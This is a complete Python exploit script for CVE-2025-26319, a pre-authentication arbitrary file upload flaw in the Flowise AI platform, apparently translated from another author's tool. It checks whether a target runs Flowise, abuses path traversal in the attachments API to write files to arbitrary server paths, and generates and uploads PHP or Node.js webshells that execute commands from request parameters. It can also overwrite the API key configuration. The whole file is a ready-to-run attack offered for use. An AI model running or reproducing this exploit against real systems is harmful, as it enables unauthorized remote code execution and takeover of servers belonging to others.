#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Flowise Pre-Auth Arbitrary File Upload (CVE-2025-26319) Exploit
# Reference: https://medium.com/@attias.dor/the-burn-notice-part-2-5-5-flowise-pre-auth-arbitrary-file-upload-cve-2025-26319-0d4194a34183
# Originaly made by YuoLuo https://github.com/YuoLuo/CVE-2025-26319
# Translated and little fixed by the29a

import requests
import argparse
import os
import sys
import mimetypes
from urllib.parse import urljoin

def banner():
    print("""
    ╔════════════════════════════════════════════════════════════════╗
    ║                                                                ║
    ║   Flowise Pre-Auth Arbitrary File Upload (CVE-2025-26319)      ║
    ║                                                                ║
    ╚════════════════════════════════════════════════════════════════╝
    """)

def check_target(url):
    """Check if the target may be a Flowise instance"""
    try:
        # Trying to access the API version endpoint, which is whitelisted
        version_url = urljoin(url, "/api/v1/version")
        resp = requests.get(version_url, timeout=10)
        if resp.status_code == 200:
            print(f"[+] The target appears to be a Flowise instance with version information: {resp.text}")
            return True
        else:
            print(f"[!] Target Response Code: {resp.status_code}, Probably not a Flowise instance")
            return False
    except Exception as e:
        print(f"[!] Error while checking target: {str(e)}")
        return False

def upload_file(url, local_file, target_path):
    """
    Uploading files to arbitrary paths with CVE-2025-26319
    
    Parameters:
    - url: Target Flowise instance URL
    - local_file: Path to the local file to be uploaded
    - target_path: Path (including filename) on the target server
    """
    if not os.path.exists(local_file):
        print(f"[!] Local file does not exist: {local_file}")
        return False
    
    # Decompose the target path into a directory and filename
    target_dir = os.path.dirname(target_path)
    target_filename = os.path.basename(target_path)
    
    if not target_filename:
        print("[!] The destination path must contain the filename")
        return False
    
    # Constructing Path Traversal Attacks
    # Use a fixed chatflowId with path traversal in the chatId
    chatflow_id = "exploit"
    
    # Construct a path traversal from the storage directory back to the target directory
    chat_id = f"..{'/..' * 10}/{target_dir.lstrip('/')}"  # Using enough of the ... Backtracking
    
    endpoint = f"/api/v1/attachments/{chatflow_id}/{chat_id}"
    upload_url = urljoin(url, endpoint)
    
    print(f"[*] Upload a file to: {upload_url}")
    print(f"[*] Target document: {target_path}")
    
    # Preparing files for upload
    try:
        file_content = open(local_file, "rb").read()
        file_mimetype = mimetypes.guess_type(local_file)[0] or "application/octet-stream"
        
        # Constructing a multipart/form-data request
        files = {
            "files": (target_filename, file_content, file_mimetype)
        }
        
        # Send Request
        response = requests.post(upload_url, files=files, timeout=30)
        
        # Check response
        if response.status_code in [200, 201]:
            print(f"[+] File uploaded successfully! Status code: {response.status_code}")
            print(f"[+] Response content: {response.text}")
            return True
        else:
            print(f"[!] File upload failed. Status Code: {response.status_code}")
            print(f"[!] Response content: {response.text}")
            return False
    except Exception as e:
        print(f"[!] Error during upload: {str(e)}")
        return False

def check_upload_success(url, target_path):
    """Try to verify that the file was uploaded successfully"""
    try:
        # Here we can only validate based on specific cases
        # For example, if you are uploading a JSON file to the API configuration directory
        if target_path.endswith('api.json'):
            api_url = urljoin(url, "/api/v1/apikey")
            resp = requests.get(api_url)
            if resp.status_code == 200:
                print("[+] Successfully verified that the API configuration file was modified!")
                return True
        
        print("[*] It is not possible to verify the file upload result directly, please confirm it manually")
        return None
    except Exception as e:
        print(f"[!] Error during validation: {str(e)}")
        return False

def generate_webshell(filename, language):
    """Generate simple webshells in different languages"""
    webshells = {
        "php": """<?php system($_REQUEST['cmd']); ?>""",
        "nodejs": """
const http = require('http');
const { exec } = require('child_process');

http.createServer((req, res) => {
    const cmd = new URL(req.url, `http://${req.headers.host}`).searchParams.get('cmd');
    if (cmd) {
        exec(cmd, (error, stdout, stderr) => {
            res.writeHead(200, { 'Content-Type': 'text/plain' });
            res.end(stdout || stderr || error);
        });
    } else {
        res.writeHead(200, { 'Content-Type': 'text/plain' });
        res.end('Ready for commands');
    }
}).listen(3333);
"""
    }
    
    if language not in webshells:
        print(f"[!] Unsupported languages: {language}")
        return None
    
    with open(filename, 'w') as f:
        f.write(webshells[language])
    
    print(f"[+] Generating{language}typology webshell: {filename}")
    return filename

def main():
    banner()
    
    parser = argparse.ArgumentParser(description="Flowise Pre-Auth Arbitrary File Upload (CVE-2025-26319) Exploit")
    parser.add_argument("-u", "--url", required=True, help="Target Flowise instance URL (Example: http://example.com:3000)")
    parser.add_argument("-f", "--file", help="Path to the local file to be uploaded")
    parser.add_argument("-d", "--destination", help="Path to the file on the target server (例如: /root/.flowise/api.json)")
    parser.add_argument("--generate-webshell", choices=["php", "nodejs"], help="Automatically generates the specified type of webshell")
    parser.add_argument("--webshell-path", help="Path to webshell on the server (Required for --generate-webshell)")
    
    args = parser.parse_args()
    
    # Check if the target is a Flowise instance
    if not check_target(args.url):
        print("[!] The target may not be a Flowise instance, do you continue? (y/n)")
        choice = input().lower()
        if choice != 'y':
            sys.exit(1)
    
    # Handling webshell generation
    if args.generate_webshell:
        if not args.webshell_path:
            print("[!] You must specify --webshell-path when using --generate-webshell")
            sys.exit(1)
        
        temp_webshell = f"temp_webshell.{args.generate_webshell}"
        generate_webshell(temp_webshell, args.generate_webshell)
        
        # Upload the generated webshell
        success = upload_file(args.url, temp_webshell, args.webshell_path)
        
        # Cleaning up temporary files
        os.remove(temp_webshell)
        
        if success:
            if args.generate_webshell == "php":
                print(f"[+] PHP Webshell was uploaded successfully and can be accessed via the following URLs: {urljoin(args.url, args.webshell_path)}")
                print(f"[+] Usage: curl '{urljoin(args.url, args.webshell_path)}?cmd=id'")
            elif args.generate_webshell == "nodejs":
                print(f"[+] Node.js backdoor script uploaded successfully, server will try to start HTTP service on port 3333")
                print(f"[+] Usage: curl '{urljoin(args.url, args.webshell_path)}?cmd=id'")
    
    # Handling regular file uploads
    elif args.file and args.destination:
        success = upload_file(args.url, args.file, args.destination)
        if success:
            check_upload_success(args.url, args.destination)
    else:
        if not (args.generate_webshell and args.webshell_path):
            print("[!]  The --file and --destination parameters must be provided, or use --generate-webshell and --webshell-path")
            parser.print_help()
            sys.exit(1)

if __name__ == "__main__":
    main()